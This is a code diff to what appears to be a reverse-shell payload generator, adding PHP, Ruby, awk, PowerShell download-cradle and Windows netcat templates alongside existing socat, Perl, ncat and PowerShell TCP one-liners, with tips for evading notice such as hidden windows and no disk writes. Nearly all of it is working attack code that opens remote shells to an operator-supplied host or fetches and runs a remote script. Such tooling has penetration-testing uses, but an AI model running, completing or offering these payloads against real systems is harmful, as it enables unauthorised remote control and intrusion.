@@ -32,7 +32,12 @@
     { id: 'socat', name: 'socat (PTY)', os: 'linux', tpl: 'socat TCP:{{lhost}}:{{lport}} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane', note: 'Full PTY if the target has socat; pair with the socat catcher.' },
     { id: 'perl', name: 'Perl', os: 'linux', tpl: "perl -e 'use Socket;$i=\"{{lhost}}\";$p={{lport}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", note: 'When Perl is present but Python is not.' },
     { id: 'ncat-ssl', name: 'ncat (TLS)', os: 'linux', tpl: 'ncat --ssl {{lhost}} {{lport}} -e /bin/bash', note: 'Encrypted; pair with the ncat (TLS) catcher.' },
+    { id: 'php', name: 'PHP', os: 'linux', tpl: 'php -r \'$sock=fsockopen("{{lhost}}",{{lport}});exec("/bin/sh -i <&3 >&3 2>&3");\'', note: 'On a LAMP box where php is on PATH; great straight off a web shell.' },
+    { id: 'ruby', name: 'Ruby', os: 'linux', tpl: "ruby -rsocket -e'f=TCPSocket.open(\"{{lhost}}\",{{lport}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", note: 'When Ruby is present (common on dev boxes) but Python is not.' },
+    { id: 'awk', name: 'awk', os: 'linux', tpl: "awk 'BEGIN {s = \"/inet/tcp/0/{{lhost}}/{{lport}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null", note: 'Last-resort when only gawk is available (needs the gawk /inet extension).' },
     { id: 'ps-tcp', name: 'PowerShell (TCP)', os: 'windows', enc: 'psenc', tpl: '$client = New-Object System.Net.Sockets.TCPClient("{{lhost}}",{{lport}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()', note: 'The standard Windows one-liner. Use the Base64 -EncodedCommand form so quoting cannot break it.' },
+    { id: 'ps-iex', name: 'PowerShell (IEX download cradle)', os: 'windows', tpl: "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/rev.ps1')\"", note: 'Host rev.ps1 (e.g. Invoke-PowerShellTcp with -Reverse) on your box with python3 -m http.server 80. No disk write on target.' },
+    { id: 'win-nc', name: 'Windows nc.exe', os: 'windows', tpl: 'nc.exe {{lhost}} {{lport}} -e cmd.exe', note: 'After you upload nc.exe (or ncat.exe --ssl ... -e cmd.exe). The -e flag is the Windows netcat build.' },
   ];
 
   function fill(tpl, lhost, lport) {
@@ -101,6 +106,11 @@
     L.push('');
     L.push('# PowerShell -EncodedCommand (UTF-16LE then base64, quoting-proof):');
     L.push(psEncodedCommand(lhost, lport));
+    PAYLOADS.filter(function (p) { return p.os === 'windows' && p.id !== 'ps-tcp'; }).forEach(function (p) {
+      L.push('');
+      L.push('# ' + p.name + ': ' + p.note);
+      L.push(fill(p.tpl, lhost, lport));
+    });
     L.push('OBOL_EOF');
     L.push('echo');
     L.push('echo "--- After you catch the shell, upgrade the TTY ---"');
